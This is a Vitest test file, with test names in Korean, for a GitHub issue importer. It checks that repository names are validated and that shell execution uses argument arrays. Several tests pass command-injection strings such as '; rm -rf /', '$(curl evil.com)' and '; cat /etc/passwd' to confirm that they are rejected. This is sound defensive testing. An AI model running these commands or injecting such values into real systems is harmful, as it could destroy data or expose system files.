import { describe, it, expect } from 'vitest';
import { readFileSync } from 'node:fs';
import { validateRepoFormat, importFromGithub } from '../importers.js';

describe('validateRepoFormat', () => {
  it('AC01: owner/repo 형식만 허용되어야 한다', () => {
    expect(() => validateRepoFormat('owner/repo')).not.toThrow();
    expect(() => validateRepoFormat('my-org/my-repo')).not.toThrow();
    expect(() => validateRepoFormat('user123/project.name')).not.toThrow();
    expect(() => validateRepoFormat('org_name/repo_name')).not.toThrow();
  });

  it('AC02: "; rm -rf /" 입력 시 에러가 발생해야 한다', () => {
    expect(() => validateRepoFormat('; rm -rf /')).toThrow();
    expect(() => validateRepoFormat('owner/repo; rm -rf /')).toThrow();
    expect(() => validateRepoFormat('$(malicious)')).toThrow();
    expect(() => validateRepoFormat('owner/repo && echo pwned')).toThrow();
    expect(() => validateRepoFormat('`whoami`/repo')).toThrow();
  });

  it('AC03: 빈 문자열 입력 시 에러가 발생해야 한다', () => {
    expect(() => validateRepoFormat('')).toThrow();
    expect(() => validateRepoFormat('  ')).toThrow();
  });
});

describe('importFromGithub - execSync 제거', () => {
  it('AC04: importers.ts에 execSync 호출이 0건이어야 한다', () => {
    const source = readFileSync(
      new URL('../importers.ts', import.meta.url).pathname.replace('/__tests__', ''),
      'utf-8',
    );
    // Should not contain execSync call (but may contain it in import for type backward compat)
    const execSyncCalls = source.match(/execSync\s*\(/g) || [];
    expect(execSyncCalls.length).toBe(0);
  });

  it('AC05: 정상 repo로 gh issue list가 동작해야 한다', () => {
    const result = importFromGithub('owner/repo');
    // Should either succeed or fail gracefully (no shell injection possible)
    expect(result).toHaveProperty('items');
    expect(result).toHaveProperty('errors');
  });

  it('AC06: label 파라미터도 배열 인자로 전달되어야 한다', () => {
    const source = readFileSync(
      new URL('../importers.ts', import.meta.url).pathname.replace('/__tests__', ''),
      'utf-8',
    );
    // Should use execFileSync with array args, not string interpolation for label
    expect(source).toContain('execFileSync');
    // Should not have string template with label in exec call
    expect(source).not.toMatch(/`[^`]*\$\{labelArg\}[^`]*`/);
  });
});

describe('보안 테스트', () => {
  it('AC07: 명령 주입 시도가 차단되어야 한다', () => {
    // These should fail validation, not execute shell commands
    const result1 = importFromGithub('; rm -rf /');
    expect(result1.errors.length).toBeGreaterThan(0);
    expect(result1.items).toEqual([]);

    const result2 = importFromGithub('$(curl evil.com)');
    expect(result2.errors.length).toBeGreaterThan(0);

    const result3 = importFromGithub('owner/repo; cat /etc/passwd');
    expect(result3.errors.length).toBeGreaterThan(0);
  });

  it('AC08: repo 형식 검증 테스트 - 경계값', () => {
    // Single segment (no slash)
    expect(() => validateRepoFormat('onlyrepo')).toThrow();
    // Too many slashes
    expect(() => validateRepoFormat('a/b/c')).toThrow();
    // Special characters
    expect(() => validateRepoFormat('owner/repo name')).toThrow();
    // Valid edge cases
    expect(() => validateRepoFormat('a/b')).not.toThrow();
    expect(() => validateRepoFormat('my.org/my.repo')).not.toThrow();
  });

  it('AC09: gh CLI 미설치 시 적절한 에러 메시지 반환', () => {
    // When gh is not available, it should return an error, not crash
    // We can't easily mock this without full module mocking, so we verify
    // the function signature and error structure
    const result = importFromGithub('nonexistent-owner/nonexistent-repo');
    expect(result).toHaveProperty('errors');
    expect(result).toHaveProperty('source_prefix');
    expect(result.source_prefix).toBe('github:nonexistent-owner/nonexistent-repo');
  });
});
